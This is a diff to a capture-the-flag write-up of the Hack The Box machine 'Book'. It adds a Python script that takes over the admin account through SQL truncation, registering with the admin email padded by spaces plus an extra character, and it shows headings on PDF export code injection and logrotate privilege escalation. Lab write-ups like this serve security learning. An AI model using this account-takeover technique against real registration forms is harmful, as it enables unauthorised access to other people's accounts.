@@ -109,6 +109,25 @@ Yup, it works.
 
 ![admin area](images/book/adminarea.png)
 
+Alternatively, a simple python script does the job as well.
+
+```
+import requests
+
+url = "http://10.10.10.176/index.php"
+admin_email = 'admin@book.htb'
+password = '123456789'
+target_length = 20
+padding = target_length - len(admin_email)
+payload = admin_email + ' ' * padding + 'a'
+
+post_data = {'name': 'goodyguy',
+			'email': payload,
+			'password': password }
+
+x = requests.post(url, data = post_data)
+```
+
 ## PDF Export Code Injection
 
 Earlier, we spotted an upload function in the **Collections section of the user account**. Upload functions are always worth scrutinizing.
@@ -284,7 +303,3 @@ Overall, a very educational box for me.
 
 * https://linux.die.net/man/8/logrotate
 * https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
-
-include python script for sql truncation
-complete logrotate
-try symlink myself
